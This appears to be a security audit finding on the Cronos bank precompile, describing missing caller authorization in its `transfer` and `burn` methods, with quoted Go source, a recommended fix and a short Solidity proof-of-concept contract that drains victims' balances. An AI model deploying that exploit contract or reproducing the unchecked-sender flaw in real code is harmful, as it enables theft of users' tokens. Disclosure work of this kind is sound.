### Title
Unauthorized Transfer and Burn of Native Precompile-Controlled Assets via Missing Caller Authorization in Bank Precompile `transfer` and `burn` - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The bank precompile's `transfer` and `burn` methods accept an arbitrary `sender`/`addr` argument and execute `bankKeeper.SendCoins` / `bankKeeper.SendCoinsFromAccountToModule` from that address without verifying that the EVM caller (`contract.Caller()`) is authorized to spend on behalf of that address. Any EVM contract can therefore drain `evm/<callerContract>` native tokens from any victim who holds a balance in that denom.

### Finding Description

In `BankContract.Run` (`x/cronos/keeper/precompiles/bank.go`), the `TransferMethodName` case unpacks a caller-supplied `sender` address and immediately uses it as the `from` account in a `bankKeeper.SendCoins` call:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
// ...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // "evm/" + callerContractAddress
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no check that `sender == contract.Caller()` (or that `contract.Caller()` holds an allowance from `sender`). The denom is scoped to the calling contract (`evm/<callerContract>`), but the source account is entirely free.

The same flaw exists in the `BurnMethodName` case, where `addr` (the address to burn from) is taken directly from the caller's input with no authorization check:

```go
addr := sdk.AccAddress(recipient.Bytes())   // attacker-controlled
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [1](#0-0) [2](#0-1) 

### Impact Explanation

The bank precompile manages native Cosmos-SDK coins whose denom is `evm/<callerContractAddress>`. These are the canonical native-layer representation of ERC20-like tokens issued by EVM contracts (e.g., `TestBank` mints `evm/0xTestBank` tokens to users via `bank.mint`). [3](#0-2) 

Because the `transfer` method does not enforce `sender == contract.Caller()`, a malicious contract can call `bank.transfer(victimAddress, attackerAddress, amount)` and the precompile will execute `bankKeeper.SendCoins(ctx, victim, attacker, coins)` unconditionally. This constitutes an **unauthorized transfer of precompile-controlled assets** — Critical under the allowed impact scope.

The same applies to `burn`: a malicious contract can call `bank.burn(victimAddress, amount)` to destroy any victim's balance in the attacker's denom.

### Likelihood Explanation

The attack requires victims to hold a balance in `evm/<attackerContract>`. This is achievable because:

1. Attacker deploys `MaliciousContract` that exposes a `moveToNative(amount)` function calling `bank.mint(msg.sender, amount)` — users who call it receive `evm/0xMalicious` native tokens.
2. Once users hold balances, the attacker calls `MaliciousContract.steal(victim, amount)` which calls `bank.transfer(victim, attacker, amount)`, draining the victim's `evm/0xMalicious` tokens without any approval.

Additionally, any legitimate contract that calls `bank.transfer(arbitrarySender, ...)` without enforcing `arbitrarySender == msg.sender` is immediately exploitable by any caller. [4](#0-3) 

### Recommendation

Add an authorization check in both the `transfer` and `burn` cases to ensure the EVM caller is the account being debited:

```go
// In TransferMethodName:
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}

// In BurnMethodName:
if contract.Caller() != recipient { // "recipient" is the address being burned from
    return nil, errors.New("burn: caller is not the token holder")
}
```

Alternatively, implement an ERC20-style allowance mechanism so that contracts can be explicitly authorized to spend on behalf of other addresses. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address to, uint256 amount) external payable returns (bool);
    function transfer(address from, address to, uint256 amount) external payable returns (bool);
}

contract MaliciousBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Lure users into minting evm/0xMaliciousBank tokens
    function deposit(uint256 amount) external {
        // (burn ERC20 or accept ETH, then mint native tokens to caller)
        bank.mint(msg.sender, amount);
    }

    // Step 2: Attacker calls this to drain any victim's evm/0xMaliciousBank balance
    function steal(address victim, address attacker, uint256 amount) external {
        // No authorization check in the precompile — succeeds unconditionally
        bank.transfer(victim, attacker, amount);
    }
}
```

When `steal(victim, attacker, amount)` is called:
- `contract.Caller()` inside the precompile is `0xMaliciousBank`
- `denom` = `"evm/0xMaliciousBank"`
- `from` = `victim` (arbitrary, no check)
- `bankKeeper.SendCoins(ctx, victim, attacker, coins)` executes, transferring the victim's `evm/0xMaliciousBank` tokens to the attacker [6](#0-5) [7](#0-6)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-204)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	default:
		return nil, errors.New("unknown method")
	}
}
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L14-17)
```text
    function moveToNative(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return bank.mint(msg.sender, amount);
    }
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L35-38)
```text
    function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return bank.transfer(msg.sender, recipient, amount);
    }
```
